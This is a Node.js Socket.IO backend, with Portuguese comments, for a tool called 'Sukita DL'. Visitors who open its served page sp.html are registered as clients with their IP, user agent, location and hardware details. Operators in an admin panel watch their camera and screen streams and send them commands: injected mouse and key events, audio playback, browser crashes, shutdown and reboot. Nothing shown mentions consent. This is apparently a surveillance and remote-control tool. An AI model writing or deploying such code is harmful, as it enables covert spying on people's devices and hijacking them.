/* Sukita DL · backend v3.3  (isolamento por chave/lab) */
const express = require('express');
const http    = require('http');
const path    = require('path');
const { v4: uuid } = require('uuid');
const { Server }   = require('socket.io');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, { cors:{origin:'*'} });

/* ─── rotas HTML por chave ─── */
app.get('/admin.html/:key', (req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.get('/sp.html/:key', (req, res) =>            //  ← NOVA ROTA
  res.sendFile(path.join(__dirname, 'public', 'sp.html')));

app.use(express.static(path.join(__dirname, 'public')));

/* ─── mapa de clientes ─── */
const clients = new Map();              // uuid → { socket, lab, … }

/* helper: lista resumida (filtra por lab) */
function summary(lab){
  return Array.from(clients.values())
              .filter(c => c.lab === lab)
              .map(c => ({
                uuid:c.uuid, ip:c.ip, ua:c.ua,
                connected_at:c.connected_at,
                location:c.location, hwinfo:c.hwinfo
              }));
}

/* helper: reenvia lista para cada admin */
function broadcastClients(){
  for(const s of io.sockets.sockets.values()){
    if(s.handshake.query.role === 'admin'){
      s.emit('clients', summary(s.data.lab));
    }
  }
}

/* helpers de stream/controle isolados por lab */
function relay(uuid, evt, data, list){
  const c = clients.get(uuid);
  if(!c) return;
  c[list].forEach(w=>{
    const admin = io.sockets.sockets.get(w);
    if(admin?.data.lab === c.lab) admin.emit(evt,{id:uuid,data});
  });
}
function addWatcher(uuid,sid,list,lab){
  const c=clients.get(uuid);
  if(c && c.lab===lab && !c[list].includes(sid)) c[list].push(sid);
}
function delWatcher(uuid,sid,list){
  const c=clients.get(uuid); if(c) c[list] = c[list].filter(x=>x!==sid);
}
function emit(uuid,evt,data){
  const c=clients.get(uuid); if(c) c.socket.emit(evt,data);
}
function timed(uuid,evt,data,delay){ setTimeout(()=>emit(uuid,evt,data),delay*1000); }

/* ─────────────────────────── conexões ─────────────────────────── */
io.on('connection', socket=>{
  const role = socket.handshake.query.role;
  const lab  = (socket.handshake.query.lab || 'DEFAULT').toUpperCase(); // chave/lab

  /* ════════════════ CLIENTE (HTML sp.html) ════════════════ */
  if(role === 'client'){
    const id = uuid();
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const ua = socket.handshake.headers['user-agent'] || '—';

    clients.set(id,{
      uuid:id, ip, ua, lab,
      connected_at:Date.now(),
      socket, watchers:[], screenWatchers:[],
      location:null, hwinfo:null
    });

    socket.emit('id', id);
    broadcastClients();

    socket.on('frame',        d=> relay(id,'frame',d,'watchers'));
    socket.on('screen-frame', d=> relay(id,'screen-frame',d,'screenWatchers'));

    socket.on('location', loc=>{
      const c=clients.get(id); if(c){ c.location=loc; io.to('lab:'+lab).emit('location-update',{uuid:id,loc}); }
    });

    socket.on('hwinfo', info=>{
      const c=clients.get(id); if(c){ c.hwinfo=info; broadcastClients(); io.to('lab:'+lab).emit('hwinfo-update',{uuid:id,info}); }
    });

    socket.on('disconnect', ()=>{ clients.delete(id); broadcastClients(); });
  }

  /* ═════════════════════ ADMIN (painel) ═════════════════════ */
  if(role === 'admin'){
    socket.data.lab = lab;
    socket.join('lab:'+lab);
    socket.emit('clients', summary(lab));

    socket.on('request-stream', uuid=> addWatcher(uuid,socket.id,'watchers',lab));
    socket.on('stop-stream',    uuid=> delWatcher(uuid,socket.id,'watchers'));
    socket.on('request-screen', uuid=> addWatcher(uuid,socket.id,'screenWatchers',lab));
    socket.on('stop-screen',    uuid=> delWatcher(uuid,socket.id,'screenWatchers'));

    socket.on('ready-audio',  ({uuid,url,delay=0})=> timed(uuid,'play-audio',{url},delay));
    socket.on('custom-audio', ({uuid,dataURL,delay=0})=> timed(uuid,'play-audio',{url:dataURL},delay));
    socket.on('stop-audio',   uuid=> emit(uuid,'stop-audio'));

    socket.on('crash-browser', uuid=> emit(uuid,'crash-browser'));
    socket.on('request-hwinfo',uuid=> emit(uuid,'request-hwinfo'));
    socket.on('shutdown',      uuid=> emit(uuid,'shutdown'));
    socket.on('reboot',        uuid=> emit(uuid,'reboot'));
    socket.on('mouse-event',   ({uuid,ev})=> emit(uuid,'mouse-event',ev));
    socket.on('key-event',     ({uuid,ev})=> emit(uuid,'key-event',ev));

    socket.on('disconnect',()=>{
      for(const c of clients.values()){
        c.watchers       = c.watchers.filter(x=>x!==socket.id);
        c.screenWatchers = c.screenWatchers.filter(x=>x!==socket.id);
      }
    });
  }
});

/* ─── start ─── */
const PORT = process.env.PORT || 3000;
server.listen(PORT, ()=> console.log(`✔  http://localhost:${PORT}`));
